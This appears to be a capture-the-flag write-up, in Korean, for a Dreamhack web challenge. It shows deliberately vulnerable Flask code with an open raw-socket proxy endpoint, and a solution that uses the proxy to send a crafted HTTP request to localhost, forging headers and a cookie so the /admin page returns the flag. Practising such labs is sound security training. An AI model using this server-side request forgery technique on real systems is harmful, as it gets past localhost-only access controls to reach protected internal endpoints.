## proxy-1
---

```python
#!/usr/bin/python3
from flask import Flask, request, render_template, make_response, redirect, url_for
import socket

app = Flask(__name__)

try:
    FLAG = open('./flag.txt', 'r').read()
except:
    FLAG = '[**FLAG**]'

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/socket', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('socket.html')
    elif request.method == 'POST':
        host = request.form.get('host')
        port = request.form.get('port', type=int)
        data = request.form.get('data')

        retData = ""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(3)
                s.connect((host, port))
                s.sendall(data.encode())
                while True:
                    tmpData = s.recv(1024)
                    retData += tmpData.decode()
                    if not tmpData: break
            
        except Exception as e:
            return render_template('socket_result.html', data=e)
        
        return render_template('socket_result.html', data=retData)


@app.route('/admin', methods=['POST'])
def admin():
    if request.remote_addr != '127.0.0.1':
        return 'Only localhost'

    if request.headers.get('User-Agent') != 'Admin Browser':
        return 'Only Admin Browser'

    if request.headers.get('DreamhackUser') != 'admin':
        return 'Only Admin'

    if request.cookies.get('admin') != 'true':
        return 'Admin Cookie'

    if request.form.get('userid') != 'admin':
        return 'Admin id'

    return FLAG

app.run(host='0.0.0.0', port=8000)
```

<br>

## Solution
---

/admin 페이지에 있는 조건들을 만족해야 FLAG를 읽을 수 있다.

첫 번째 조건은 remote address가 localhost여야 한다.

이 부분은 문제에서 socket 페이지를 통해 해결할 수 있다. ```host: 127.0.0.1, port=8000````

두 번쨰 조건 부터는 header를 추가해줘야 한다. 이 또한 socket 페이지의 data 값으로 header를 추가하면 된다.

```
POST /admin HTTP/1.1
Content-Length: 12
User-Agent: Admin Browser
Content-Type: application/x-www-form-urlencoded
DreamhackUser: admin
Cookie: admin=true
Connection: close

userid=admin
```
